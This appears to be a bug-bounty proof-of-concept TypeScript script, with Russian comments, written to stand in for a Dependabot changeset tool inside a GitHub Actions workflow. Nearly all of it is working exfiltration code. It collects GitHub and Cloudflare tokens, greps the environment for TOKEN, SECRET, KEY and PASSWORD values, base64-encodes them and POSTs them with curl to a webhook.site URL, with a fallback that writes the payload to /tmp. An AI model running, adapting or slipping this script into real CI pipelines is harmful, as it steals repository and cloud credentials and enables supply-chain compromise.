// Target: tools/dependabot/generate-dependabot-pr-changesets.ts
// Action: Send data to webhook.site

import { execSync } from 'node:child_process';

const exfilUrl = 'https://webhook.site/c37696bd-ed3a-4f6b-b87a-8fd86736afdf'; // Ваш URL

let payload = {
  description: "PoC RCE H1 Report #3145501 - Data Exfiltration",
  prNumber: process.argv[2] || 'PR_NUMBER_NOT_PASSED_AS_ARG',
  workflowRunId: process.env.GITHUB_RUN_ID || 'RUN_ID_NOT_FOUND_IN_ENV',
  githubActor: process.env.GITHUB_ACTOR || 'NOT_FOUND',
  githubRepository: process.env.GITHUB_REPOSITORY || 'NOT_FOUND',
  githubWorkspace: process.env.GITHUB_WORKSPACE || 'NOT_FOUND',
  githubHeadRef: process.env.GITHUB_HEAD_REF || 'NOT_FOUND',
  secrets: {} as Record<string, string | undefined>,
  envDump: ""
};

// Попытка получить конкретные токены
payload.secrets.GH_ACCESS_TOKEN = process.env.GH_ACCESS_TOKEN || "NOT_FOUND_IN_PROCESS_ENV";
payload.secrets.GITHUB_TOKEN_FULL_UNREDACTED = process.env.GITHUB_TOKEN || "NOT_FOUND_IN_PROCESS_ENV"; // ОСТОРОЖНО: это полный токен
payload.secrets.CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN || "NOT_FOUND_IN_PROCESS_ENV"; // Если вдруг он доступен в этом контексте

// Более безопасный способ показать наличие GITHUB_TOKEN без его полной утечки в логах webhook.site, если он очень длинный
if (process.env.GITHUB_TOKEN) {
    payload.secrets.GITHUB_TOKEN_PREFIX = process.env.GITHUB_TOKEN.substring(0, 20) + "...";
} else {
    payload.secrets.GITHUB_TOKEN_PREFIX = "NOT_FOUND_IN_PROCESS_ENV";
}

try {
    // Захват всех переменных окружения для анализа (может быть очень много данных)
    // Для PoC можно ограничиться только теми, что содержат "TOKEN" или "SECRET"
    const envOutput = execSync('env | grep -E "TOKEN|SECRET|KEY|PASSWORD" || true').toString().trim();
    payload.envDump = envOutput.replace(/\n/g, " ; ");
} catch (e: any) {
    payload.envDump = `ENV_DUMP_FAILED: ${e.message}`;
}

const messageString = JSON.stringify(payload, null, 2);
const encodedMessage = Buffer.from(messageString).toString('base64');

console.log(`[MALICIOUS SCRIPT] Preparing to exfiltrate information to: ${exfilUrl}`);
console.log(`[MALICIOUS SCRIPT] Payload (first 100 chars): ${messageString.substring(0,100)}...`);

try {
  // Используем execSync для простоты, но в реальном эксплоите можно использовать асинхронные запросы
  execSync(`curl -X POST -H "Content-Type: application/json" -H "X-PoC-Attempt: H1-3145501" --data '{"report_id":"H1-3145501","base64_payload":"${encodedMessage}"}' "${exfilUrl}"`);
  console.log(`[MALICIOUS SCRIPT] Data exfiltration attempted.`);
} catch (e: any) {
  console.error(`[MALICIOUS SCRIPT] Curl command failed: ${e.message}`);
  // Фоллбэк, если curl не удался (маловероятно в GitHub Actions runner, но для полноты)
  const fallbackFile = "/tmp/proof_fallback_h1_3145501.txt";
  execSync(`echo '${encodedMessage}' > ${fallbackFile}`);
  console.log(`[MALICIOUS SCRIPT] Wrote base64_payload to ${fallbackFile} as fallback.`);
}

console.log('[MALICIOUS SCRIPT] Execution finished.');
// process.exit(0); // Можно добавить, если нужно, чтобы шаг workflow не выглядел упавшим из-за ошибки в curl, если она произойдет